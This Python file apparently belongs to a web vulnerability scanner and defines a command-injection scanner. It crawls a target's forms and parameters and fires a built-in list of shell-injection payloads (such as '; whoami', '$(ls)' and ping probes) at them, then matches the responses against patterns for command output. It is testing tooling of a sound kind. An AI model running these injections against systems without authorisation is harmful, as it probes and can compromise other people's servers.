import re
import urllib.parse
import requests
from bs4 import BeautifulSoup
from typing import Dict, Any, List, Optional, Set
from concurrent.futures import ThreadPoolExecutor

from app.scanners.base_scanner import BaseScanner


class CommandInjectionScanner(BaseScanner):
    """
    Scanner to detect Command Injection vulnerabilities
    """

    name = "Command Injection Scanner"
    description = "Detects Command Injection vulnerabilities in web applications"

    # Command Injection payloads to try
    PAYLOADS = [
        "; ls",
        "& ls",
        "| ls",
        "|| ls",
        "& dir",
        "; dir",
        "| dir",
        "|| dir",
        "$(ls)",
        "`ls`",
        "; whoami",
        "& whoami",
        "| whoami",
        "|| whoami",
        "$(whoami)",
        "`whoami`",
        "| echo vulnerable",
        "; echo vulnerable",
        "& echo vulnerable",
        "|| echo vulnerable",
        "; ping -c 2 127.0.0.1",
        "& ping -c 2 127.0.0.1",
        "| ping -c 2 127.0.0.1",
        "|| ping -c 2 127.0.0.1",
        "& ping -n 2 127.0.0.1",  # Windows version
        "; ping -n 2 127.0.0.1",  # Windows version
    ]

    # Patterns that indicate a successful command injection
    SUCCESS_PATTERNS = [
        r"((root|daemon|bin|sys|sync|games|man|mail|news|www-data|postgres):.*:0:[01]:|[0-9]:[0-9]:\/)",  # Linux user list
        r"(\s+[0-9]+\s+[0-9]+\s+[0-9]+\s+[a-zA-Z]+\s+[a-zA-Z]+\s+[0-9]+\s+[0-9][0-9]:[0-9][0-9]:[0-9][0-9])",  # ls output
        r"(uid=[0-9]+\(.+\)\s+gid=[0-9]+\(.+\)\s+groups=[0-9]+\(.+\))",  # id command output
        r"(Linux .+ [0-9]+(?:\.[0-9]+){2,3} .+ GNU\/Linux)",  # Linux version
        r"(Microsoft Windows \[Version [0-9\.]+\]|Windows \[\w+\])",  # Windows version
        r"(Directory of |<DIR>|Volume in drive|Volume Serial Number)",  # Windows dir command
        r"(bytes from 127.0.0.1|64 bytes from|PING: transmit failed|ping statistics|Pinging 127.0.0.1)",  # ping output
        r"(vulnerable)",  # echo output
        r"(NT AUTHORITY\\|Administrator|SYSTEM)",  # Windows user
    ]

    def __init__(self, target_url: str, cookies: Optional[str] = None):
        super().__init__(target_url, cookies)
        self.base_url = target_url
        self.vulnerable_endpoints: List[Dict[str, Any]] = []
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        self.session = requests.Session()
        self.max_threads = 10

    def scan(self) -> Dict[str, Any]:
        """Run Command Injection scan"""
        self.progress = 10

        # Set cookies if provided
        if self.cookies:
            self._set_cookies()

        try:
            # Find potential vulnerable parameters
            params = self._find_parameters()
            self.progress = 30

            # Test each parameter for Command Injection
            if params:
                self._test_parameters(params)
            self.progress = 100

            return {"vulnerable_endpoints": self.vulnerable_endpoints}

        except Exception as e:
            self.logger.error(f"Error in Command Injection scan: {e}")
            return {"error": str(e), "vulnerable_endpoints": self.vulnerable_endpoints}

    def _set_cookies(self):
        """Set cookies in the request session"""
        try:
            if not self.cookies:
                return

            cookie_pairs = self.cookies.split(";")
            for cookie_pair in cookie_pairs:
                if "=" in cookie_pair:
                    name, value = cookie_pair.strip().split("=", 1)
                    self.session.cookies.set(name, value)
        except Exception as e:
            self.logger.error(f"Error setting cookies: {e}")

    def _find_parameters(self) -> List[Dict[str, Any]]:
        """Find potential URL parameters that could be vulnerable to Command Injection"""
        potential_params = []

        try:
            # Get the page content
            response = self.session.get(self.base_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")

            # Find forms and their inputs
            for form in soup.find_all("form"):
                form_action = form.get("action", "")
                form_method = form.get("method", "get").lower()
                form_url = urllib.parse.urljoin(self.base_url, form_action)

                # Find inputs
                inputs = {}
                for input_tag in form.find_all("input"):
                    input_name = input_tag.get("name")
                    input_value = input_tag.get("value", "")
                    if input_name:
                        inputs[input_name] = input_value

                if inputs:
                    potential_params.append(
                        {"url": form_url, "method": form_method, "params": inputs}
                    )

            # Find links with parameters
            for link in soup.find_all("a", href=True):
                href = link["href"]
                parsed_url = urllib.parse.urlparse(href)

                # If link has query parameters
                if parsed_url.query:
                    query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                    if query_params:
                        full_url = urllib.parse.urljoin(self.base_url, href)
                        potential_params.append(
                            {
                                "url": full_url.split("?")[
                                    0
                                ],  # Base URL without parameters
                                "method": "get",
                                "params": query_params,
                            }
                        )

            # Additional check for common parameter names that might be vulnerable
            common_params = [
                "cmd",
                "exec",
                "command",
                "execute",
                "ping",
                "query",
                "jump",
                "code",
                "reg",
                "do",
                "func",
                "function",
                "option",
                "load",
                "process",
                "run",
                "daemon",
            ]
            for param in common_params:
                potential_params.append(
                    {
                        "url": self.base_url,
                        "method": "get",
                        "params": {param: "test"},
                    }
                )

            return potential_params

        except Exception as e:
            self.logger.error(f"Error finding parameters: {e}")
            return []

    def _test_parameters(self, potential_params: List[Dict[str, Any]]):
        """Test potential parameters for Command Injection vulnerabilities"""
        for param_info in potential_params:
            url = param_info["url"]
            method = param_info["method"]
            params = param_info["params"]

            # Test each parameter
            for param_name, param_value in params.items():
                self._test_parameter(url, method, param_name, params)

    def _test_parameter(
        self, url: str, method: str, target_param: str, all_params: Dict[str, str]
    ):
        """Test a specific parameter for Command Injection"""
        # Test with different payloads
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            test_tasks = []

            for payload in self.PAYLOADS:
                # Create a copy of params and modify the target parameter
                params = all_params.copy()
                params[target_param] = payload

                if method.lower() == "get":
                    test_tasks.append(
                        executor.submit(
                            self._test_payload_get, url, params, target_param, payload
                        )
                    )
                elif method.lower() == "post":
                    test_tasks.append(
                        executor.submit(
                            self._test_payload_post, url, params, target_param, payload
                        )
                    )

            # Wait for all tasks to complete
            for task in test_tasks:
                task.result()

    def _test_payload_get(
        self, url: str, params: Dict[str, str], param_name: str, payload: str
    ):
        """Test a GET request with Command Injection payload"""
        try:
            response = self.session.get(
                url,
                params=params,
                headers=self.headers,
                timeout=10,
                allow_redirects=False,
            )
            self._check_response(response, url, "GET", param_name, payload)
        except Exception as e:
            self.logger.debug(f"Error testing payload: {e}")

    def _test_payload_post(
        self, url: str, data: Dict[str, str], param_name: str, payload: str
    ):
        """Test a POST request with Command Injection payload"""
        try:
            response = self.session.post(
                url, data=data, headers=self.headers, timeout=10, allow_redirects=False
            )
            self._check_response(response, url, "POST", param_name, payload)
        except Exception as e:
            self.logger.debug(f"Error testing payload: {e}")

    def _check_response(
        self, response, url: str, method: str, param_name: str, payload: str
    ):
        """Check if response indicates successful Command Injection"""
        # Check if response contains patterns of successful Command Injection
        content = response.text

        is_vulnerable = False
        matched_pattern = None
        for pattern in self.SUCCESS_PATTERNS:
            match = re.search(pattern, content)
            if match:
                is_vulnerable = True
                matched_pattern = match.group(0)
                break

        # If vulnerable, add to the list of vulnerable endpoints
        if is_vulnerable:
            vulnerability = {
                "url": url,
                "method": method,
                "parameter": param_name,
                "payload": payload,
                "evidence": (
                    matched_pattern[:200]
                    if matched_pattern
                    else self._extract_evidence(content)
                ),
                "severity": "critical",
            }

            # Add only if not already added for this URL and parameter
            if not any(
                v["url"] == url and v["parameter"] == param_name
                for v in self.vulnerable_endpoints
            ):
                self.vulnerable_endpoints.append(vulnerability)
                self.logger.warning(
                    f"Found Command Injection vulnerability: {url}, parameter: {param_name}"
                )

    def _extract_evidence(self, content: str) -> str:
        """Extract a snippet of evidence from the response content"""
        # Try to find the most relevant portion of the content as evidence
        for pattern in self.SUCCESS_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                # Get a window of text around the match
                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)
                return content[start:end]

        # Default: return a short portion of the content
        return content[:200] if len(content) > 200 else content
